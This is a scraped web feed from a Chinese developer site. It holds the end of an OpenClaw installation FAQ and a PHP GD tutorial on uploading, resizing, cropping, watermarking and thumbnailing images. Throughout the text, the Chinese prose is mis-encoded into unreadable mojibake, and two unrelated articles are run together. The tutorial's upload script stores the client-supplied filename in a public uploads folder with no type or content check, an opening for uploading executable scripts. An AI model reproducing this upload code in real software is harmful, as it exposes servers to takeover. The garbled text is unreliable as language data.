<h4 data-id="heading-13">OpenClaw å¯ä»¥åœ¨ Windows æˆ– macOS ä¸Šè¿è¡Œå—ï¼Ÿ</h4>
<p>å¯ä»¥ã€‚OpenClaw æ”¯æŒ Macã€Windows å’Œ Linux ç³»ç»Ÿã€‚æœ¬æ•™ç¨‹ä»¥ Linux ä¸ºä¾‹ï¼Œå…¶ä»–ç³»ç»Ÿçš„å®‰è£…æ–¹å¼å¯å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openclaw.ai%2F" target="_blank" title="https://docs.openclaw.ai/" ref="nofollow noopener noreferrer">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<h4 data-id="heading-14">é£ä¹¦æœºå™¨äººé…ç½®åæ— æ³•æ”¶åˆ°æ¶ˆæ¯æ€ä¹ˆåŠï¼Ÿ</h4>
<p>è¯·æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>ç¡®è®¤é£ä¹¦æ’ä»¶å·²æ­£ç¡®å®‰è£…ï¼ˆ<code>clawdbot plugins install @m1heng-clawd/feishu</code>ï¼‰</li>
<li>æ£€æŸ¥ App ID å’Œ App Secret é…ç½®æ˜¯å¦æ­£ç¡®</li>
<li>ç¡®è®¤å·²å¼€é€šã€Œæ¥æ”¶æ¶ˆæ¯ã€äº‹ä»¶æƒé™</li>
<li>æ£€æŸ¥é•¿è¿æ¥æ¨¡å¼æ˜¯å¦é…ç½®æˆåŠŸ</li>
<li>ç¡®ä¿åº”ç”¨ç‰ˆæœ¬å·²å‘å¸ƒ</li>
</ol>
<h4 data-id="heading-15">OpenClaw æ•°æ®å®‰å…¨å—ï¼Ÿ</h4>
<p>OpenClaw è¿è¡Œåœ¨ä½ è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œæ‰€æœ‰æ•°æ®éƒ½åœ¨æœ¬åœ°å­˜å‚¨ï¼Œä¸ä¼šä¸Šä¼ åˆ°ç¬¬ä¸‰æ–¹äº‘ç«¯ã€‚ä½†ç”±äºå®ƒå…·æœ‰ç³»ç»Ÿçº§æƒé™ï¼Œå»ºè®®åœ¨ç‹¬ç«‹çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œé¿å…åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–é‡è¦æ•°æ®çš„æœºå™¨ä¸Šè¿è¡Œã€‚</p>
<h4 data-id="heading-16">é™¤äº†é£ä¹¦ï¼ŒOpenClaw è¿˜æ”¯æŒå“ªäº›å¹³å°ï¼Ÿ</h4>
<p>OpenClaw æ”¯æŒå¤šä¸ªèŠå¤©å¹³å°ï¼ŒåŒ…æ‹¬ WhatsAppã€Telegramã€Discordã€Slackã€Microsoft Teamsã€Signalã€iMessageã€Google Chatã€Twitch ç­‰ã€‚æ¯ä¸ªå¹³å°éœ€è¦å®‰è£…å¯¹åº”çš„æ’ä»¶ã€‚</p>
<h4 data-id="heading-17">OpenClaw å¯ä»¥åšä»€ä¹ˆï¼Ÿ</h4>
<p>OpenClaw å¯ä»¥æ‰§è¡Œå¤šç§ä»»åŠ¡ï¼š</p>
<ul>
<li>é‚®ä»¶ç®¡ç†å’Œè‡ªåŠ¨å›å¤</li>
<li>æ—¥ç¨‹å®‰æ’å’Œæé†’</li>
<li>æµè§ˆç½‘é¡µå’Œæ•°æ®æå–</li>
<li>æ–‡ä»¶è¯»å†™å’Œç®¡ç†</li>
<li>æ‰§è¡Œ Shell å‘½ä»¤</li>
<li>ç¼–å†™å’Œè¿è¡Œä»£ç </li>
<li>æ•°æ®æŸ¥è¯¢å’Œåˆ†æ</li>
</ul>
<h4 data-id="heading-18">å¦‚ä½•æ›´æ–° OpenClaw åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Ÿ</h4>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ›´æ–°ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">openclaw update
</code></pre>
<h4 data-id="heading-19">OpenClaw å‘½ä»¤å’Œ clawdbot å‘½ä»¤æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h4>
<p>OpenClaw æ›´ååï¼Œå®˜æ–¹æ¨èä½¿ç”¨ <code>openclaw</code> å‘½ä»¤ï¼Œä½†ä¸ºäº†å…¼å®¹æ€§ï¼Œ<code>clawdbot</code> å‘½ä»¤ä»ç„¶å¯ç”¨ã€‚ä¸¤è€…åŠŸèƒ½å®Œå…¨ç›¸åŒï¼Œå»ºè®®æ–°ç”¨æˆ·ç›´æ¥ä½¿ç”¨ <code>openclaw</code> å‘½ä»¤ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½]]></title>    <link>https://juejin.cn/post/7601169987395403827</link>    <guid>https://juejin.cn/post/7601169987395403827</guid>    <pubDate>2026-01-31T00:39:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601169987395403827" data-draft-id="7600982613654192178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½"/> <meta itemprop="keywords" content="åç«¯,PHP"/> <meta itemprop="datePublished" content="2026-01-31T00:39:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:39:34.000Z" title="Sat Jan 31 2026 00:39:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½</h2>
<p>æåˆ° PHP å’Œå›¾åƒï¼Œä½ ä¼šæƒ³åˆ°ä»€ä¹ˆï¼Ÿå¤§æ¦‚æ˜¯ä¸Šä¼ ä¸€å¼ å›¾ç‰‡åˆ°ç½‘ç«™ï¼Œç„¶åæ”¶å·¥ã€‚ä½† PHP å¯ä¸åªæ˜¯ä¸ªä¸Šä¼ å·¥å…·â€”â€”å®ƒåœ¨å›¾åƒå¤„ç†æ–¹é¢è—ç€ä¸å°‘æœ¬äº‹ã€‚</p>
<p>å›¾ç‰‡å¤ªå¤§æ”¾ä¸ä¸‹ç½‘é¡µï¼Ÿéœ€è¦è£æ‰èƒŒæ™¯é‡Œé‚£ä¸ªä¹±å…¥çš„è·¯äººï¼ŸPHP éƒ½èƒ½æå®šã€‚æ— è®ºæ˜¯ç¼©æ”¾ã€è£å‰ªã€åŠ æ°´å°ï¼Œè¿˜æ˜¯åƒ Instagram é‚£æ ·åŠ æ»¤é•œï¼ŒPHP éƒ½èƒ½èƒœä»»ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ä¼šå¸¦ä½ äº†è§£ PHP å›¾åƒå¤„ç†çš„æ›´å¤šç©æ³•ã€‚æˆ‘ä»¬ä¼šæ·±å…¥ GD åº“ï¼Œé¡ºä¾¿èŠèŠ Imagickã€‚</p>
<h3 data-id="heading-1">GD å’Œ Imagickï¼šä¸¤å¤§å›¾åƒå¤„ç†åº“</h3>
<p>åœ¨åŠ¨æ‰‹ä¹‹å‰ï¼Œå…ˆä»‹ç»ä¸¤ä¸ªæ ¸å¿ƒå·¥å…·ï¼šGD åº“å’Œ Imagickã€‚</p>
<h4 data-id="heading-2">GD åº“ï¼šç¨³å®šå¯é çš„è€ä¼™è®¡</h4>
<p>PHP å†…ç½®çš„ GD åº“æ˜¯ä¸ªç»å…¸é€‰æ‹©ï¼Œé€‚åˆå¤„ç†åŸºç¡€çš„å›¾åƒæ“ä½œï¼šç¼©æ”¾ã€è£å‰ªã€æ·»åŠ æ–‡å­—ã€‚å®ƒé»˜è®¤å°±åœ¨ PHP é‡Œï¼Œä¸ç”¨é¢å¤–å®‰è£…ã€‚è™½ç„¶ä¸æ˜¯æœ€ç‚«çš„ï¼Œä½†å¤Ÿç”¨ã€ç¨³å®šã€‚</p>
<h4 data-id="heading-3">Imagickï¼šåŠŸèƒ½æ›´å¼ºçš„æ–°é€‰æ‹©</h4>
<p>Imagick æ˜¯å¦ä¸€ä¸ªå›¾åƒå¤„ç†åº“ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ã€‚å®ƒæ“…é•¿å¤„ç†çŸ¢é‡å›¾ã€åº”ç”¨ç‰¹æ•ˆã€æ”¯æŒæ›´å¤šæ ¼å¼ã€‚å¦‚æœä½ éœ€è¦åšå¤æ‚çš„å›¾åƒå¤„ç†ï¼ŒImagick æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ä¸è¿‡æœ¬æ–‡ä¸»è¦ç”¨ GD åº“æ¥æ¼”ç¤ºã€‚</p>
<h3 data-id="heading-4">åŸºç¡€ï¼šå›¾åƒä¸Šä¼ </h3>
<p>åœ¨å¤„ç†å›¾åƒä¹‹å‰ï¼Œå¾—å…ˆæŠŠå®ƒä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåŸºç¡€çš„ä¸Šä¼ è„šæœ¬ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">'POST'</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>])) {
    <span class="hljs-variable">$image</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>];
    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">'uploads/'</span>;
    <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$image</span>[<span class="hljs-string">'name'</span>]);
    
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$image</span>[<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$uploadFile</span>)) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Image uploaded successfully!'</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Failed to upload image.'</span>;
    }
}
</code></pre>
<p>è¿™æ®µä»£ç æŠŠä¸Šä¼ çš„å›¾ç‰‡ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹å¤„ç†äº†ã€‚</p>
<h3 data-id="heading-5">ä½¿ç”¨ GD åº“å¤„ç†å›¾åƒ</h3>
<p>ä¸Šä¼ æå®šäº†ï¼Œç°åœ¨è¿›å…¥æ­£é¢˜â€”â€”å›¾åƒå¤„ç†ã€‚</p>
<h4 data-id="heading-6">ç¼©æ”¾å›¾åƒ</h4>
<p>å›¾ç‰‡å¤ªå¤§ä¼šæ‹–æ…¢é¡µé¢åŠ è½½é€Ÿåº¦ã€‚ç”¨ GD åº“å¯ä»¥è½»æ¾ç¼©æ”¾ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resizeImage</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    
    <span class="hljs-variable">$newImage</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>);
    <span class="hljs-title function_ invoke__">imagecopyresized</span>(<span class="hljs-variable">$newImage</span>, <span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>, <span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$newImage</span>, <span class="hljs-variable">$target</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$newImage</span>);
}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æŠŠå›¾åƒç¼©æ”¾åˆ°æŒ‡å®šçš„å®½é«˜ï¼Œé€‚åˆåœ¨å±•ç¤ºå‰è°ƒæ•´å›¾ç‰‡å°ºå¯¸ã€‚</p>
<h4 data-id="heading-7">è£å‰ªå›¾åƒ</h4>
<p>éœ€è¦è£æ‰å›¾ç‰‡çš„æŸä¸ªåŒºåŸŸï¼Ÿç”¨ <code>imagecrop()</code> å‡½æ•°ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cropImage</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$x</span>, <span class="hljs-variable">$y</span>, <span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    
    <span class="hljs-variable">$croppedImage</span> = <span class="hljs-title function_ invoke__">imagecrop</span>(<span class="hljs-variable">$image</span>, [<span class="hljs-string">'x'</span> =&gt; <span class="hljs-variable">$x</span>, <span class="hljs-string">'y'</span> =&gt; <span class="hljs-variable">$y</span>, <span class="hljs-string">'width'</span> =&gt; <span class="hljs-variable">$width</span>, <span class="hljs-string">'height'</span> =&gt; <span class="hljs-variable">$height</span>]);
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$croppedImage</span> !== <span class="hljs-literal">FALSE</span>) {
        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$croppedImage</span>, <span class="hljs-variable">$target</span>);
        <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$croppedImage</span>);
    }
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
}
</code></pre>
<p>æŒ‡å®šè£å‰ªåŒºåŸŸçš„åæ ‡å’Œå°ºå¯¸ï¼ŒPHP ä¼šå¸®ä½ å®Œæˆå‰©ä¸‹çš„å·¥ä½œã€‚</p>
<h4 data-id="heading-8">æ·»åŠ æ°´å°</h4>
<p>å¦‚æœä½ è¿è¥ä¸€ä¸ªå…è®¸ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡çš„ç½‘ç«™ï¼Œç»™å›¾ç‰‡åŠ æ°´å°å¯ä»¥é˜²æ­¢ç›—ç”¨ã€‚ä¸‹é¢æ˜¯æ·»åŠ æ°´å°çš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addWatermark</span>(<span class="hljs-params"><span class="hljs-variable">$imagePath</span>, <span class="hljs-variable">$watermarkPath</span>, <span class="hljs-variable">$targetPath</span></span>) </span>{
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$imagePath</span>);
    <span class="hljs-variable">$watermark</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$watermarkPath</span>);
    
    <span class="hljs-variable">$imageWidth</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-variable">$imageHeight</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-variable">$watermarkWidth</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$watermark</span>);
    <span class="hljs-variable">$watermarkHeight</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$watermark</span>);
    
    <span class="hljs-comment">// æ°´å°æ”¾åœ¨å³ä¸‹è§’</span>
    <span class="hljs-variable">$destX</span> = <span class="hljs-variable">$imageWidth</span> - <span class="hljs-variable">$watermarkWidth</span> - <span class="hljs-number">10</span>;
    <span class="hljs-variable">$destY</span> = <span class="hljs-variable">$imageHeight</span> - <span class="hljs-variable">$watermarkHeight</span> - <span class="hljs-number">10</span>;
    
    <span class="hljs-title function_ invoke__">imagecopy</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$watermark</span>, <span class="hljs-variable">$destX</span>, <span class="hljs-variable">$destY</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$watermarkWidth</span>, <span class="hljs-variable">$watermarkHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$targetPath</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$watermark</span>);
}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æŠŠ PNG æ ¼å¼çš„æ°´å°å åŠ åˆ°å›¾ç‰‡å³ä¸‹è§’ã€‚</p>
<h3 data-id="heading-9">è¿›é˜¶ï¼šæ»¤é•œå’Œç¼©ç•¥å›¾</h3>
<p>æŒæ¡äº†åŸºç¡€æ“ä½œï¼Œæ¥çœ‹çœ‹æ›´é«˜çº§çš„ç©æ³•ã€‚</p>
<h4 data-id="heading-10">åº”ç”¨æ»¤é•œ</h4>
<p>GD åº“æ”¯æŒç»™å›¾åƒæ·»åŠ æ»¤é•œã€‚æ¯”å¦‚æŠŠå›¾ç‰‡è½¬æˆç°åº¦ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">applyGrayscale</span>(<span class="hljs-params"><span class="hljs-variable">$imagePath</span>, <span class="hljs-variable">$targetPath</span></span>) </span>{
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$imagePath</span>);
    
    <span class="hljs-title function_ invoke__">imagefilter</span>(<span class="hljs-variable">$image</span>, IMG_FILTER_GRAYSCALE);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$targetPath</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
}
</code></pre>
<p>é™¤äº†ç°åº¦ï¼Œè¿˜å¯ä»¥è°ƒæ•´äº®åº¦ã€å¯¹æ¯”åº¦ï¼Œç”šè‡³åšåƒç´ åŒ–æ•ˆæœã€‚</p>
<h4 data-id="heading-11">ç”Ÿæˆç¼©ç•¥å›¾</h4>
<p>åœ¨å›¾ç‰‡åº“æˆ–å•†å“åˆ—è¡¨ä¸­ï¼Œç¼©ç•¥å›¾æ˜¯å¿…ä¸å¯å°‘çš„ã€‚ä¸‹é¢æ˜¯ç”Ÿæˆç¼©ç•¥å›¾çš„å‡½æ•°ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createThumbnail</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$thumbWidth</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$thumbHeight</span> = (<span class="hljs-variable">$thumbWidth</span> / <span class="hljs-variable">$originalWidth</span>) * <span class="hljs-variable">$originalHeight</span>;
    
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$thumb</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-variable">$thumbWidth</span>, <span class="hljs-variable">$thumbHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagecopyresized</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$thumbWidth</span>, <span class="hljs-variable">$thumbHeight</span>, <span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-variable">$target</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$thumb</span>);
}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æŒ‰æŒ‡å®šå®½åº¦ç”Ÿæˆç¼©ç•¥å›¾ï¼ŒåŒæ—¶ä¿æŒåŸå›¾çš„å®½é«˜æ¯”ã€‚</p>
<h3 data-id="heading-12">å¸¸è§é—®é¢˜æ’æŸ¥</h3>
<p>å›¾åƒå¤„ç†æœ‰æ—¶ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼Œè¿™é‡Œåˆ—å‡ºå‡ ä¸ªå¸¸è§çš„ã€‚</p>
<h4 data-id="heading-13">å›¾åƒæŸå</h4>
<p>å¦‚æœ PHP æ— æ³•æ­£ç¡®å¤„ç†å›¾åƒæ–‡ä»¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŸåã€‚å¤„ç†å‰å…ˆç”¨ <code>getimagesize()</code> éªŒè¯æ–‡ä»¶æ˜¯å¦ä¸ºæœ‰æ•ˆå›¾åƒï¼ŒåŒæ—¶ç¡®è®¤æ–‡ä»¶æ ¼å¼ï¼ˆJPEGã€PNGã€GIFï¼‰ã€‚</p>
<h4 data-id="heading-14">å†…å­˜ä¸è¶³</h4>
